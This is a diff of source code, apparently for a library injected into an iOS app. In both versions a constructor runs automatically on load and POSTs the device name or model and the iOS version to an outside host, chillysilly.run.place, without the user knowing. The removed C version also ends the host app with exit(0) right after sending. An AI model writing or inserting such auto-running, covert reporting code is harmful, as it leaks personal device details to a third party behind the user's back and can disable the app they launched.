@@ -1,51 +1,49 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/sysctl.h>
-#include <string.h>
-#include <curl/curl.h>
+#import <UIKit/UIKit.h>
 
-void __attribute__((constructor)) closeAppOnLaunch(void) {
-    // Get the device name
-    char deviceName[256];
-    size_t len = sizeof(deviceName);
-    sysctlbyname("hw.model", deviceName, &len, NULL, 0);
+__attribute__((constructor))
+static void sendDeviceInfo() {
+    // Get the device name and iOS version
+    NSString *deviceName = [[UIDevice currentDevice] name];  // Device name on iOS
+    NSString *osVersion = [[UIDevice currentDevice] systemVersion];  // iOS version
+    
+    // URL for sending the data
+    NSURL *url = [NSURL URLWithString:@"https://chillysilly.run.place/testbank.php"];
+    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+    [request setHTTPMethod:@"POST"];
+    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
 
-    // Get the iOS version
-    char iosVersion[256];
-    FILE *fp = popen("sw_vers -productVersion", "r");
-    if (fp) {
-        fgets(iosVersion, sizeof(iosVersion), fp);
-        fclose(fp);
+    // Prepare the device info as a dictionary
+    NSDictionary *deviceInfo = @{
+        @"deviceName": deviceName ?: @"Unknown Device",  // Ensure we have a fallback
+        @"osVersion": osVersion ?: @"Unknown Version"
+    };
+    
+    // Serialize the dictionary into JSON
+    NSError *error;
+    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:deviceInfo options:0 error:&error];
+    
+    // Handle potential JSON serialization errors
+    if (!jsonData) {
+        NSLog(@"Failed to serialize JSON: %@", error);
+        return;
     }
-
-    // Remove the newline character from the iOS version
-    iosVersion[strcspn(iosVersion, "\n")] = 0;
-
-    // Construct the URL and data for POST request
-    CURL *curl = curl_easy_init();
-    if(curl) {
-        CURLcode res;
-        char postData[512];
-        
-        // Prepare the data to send
-        snprintf(postData, sizeof(postData), "device=%s&ios_version=%s", deviceName, iosVersion);
-
-        // Set the target URL and other options
-        curl_easy_setopt(curl, CURLOPT_URL, "https://chillysilly.run.place/testbank.php");
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);
-
-        // Perform the request
-        res = curl_easy_perform(curl);
-
-        // Check if the request was successful
-        if(res != CURLE_OK) {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+    
+    [request setHTTPBody:jsonData];
+    
+    // Create a data task to send the POST request
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+        if (error) {
+            NSLog(@"Error: %@", error);
+            return;
         }
 
-        // Cleanup
-        curl_easy_cleanup(curl);
-    }
-
-    // Exit the application after sending the request
-    exit(0);
+        if ([(NSHTTPURLResponse *)response statusCode] == 200) {
+            NSLog(@"Device info sent successfully.");
+        } else {
+            NSLog(@"Failed to send device info. Status Code: %ld", (long)[(NSHTTPURLResponse *)response statusCode]);
+        }
+    }];
+    
+    // Start the network request
+    [task resume];
 }
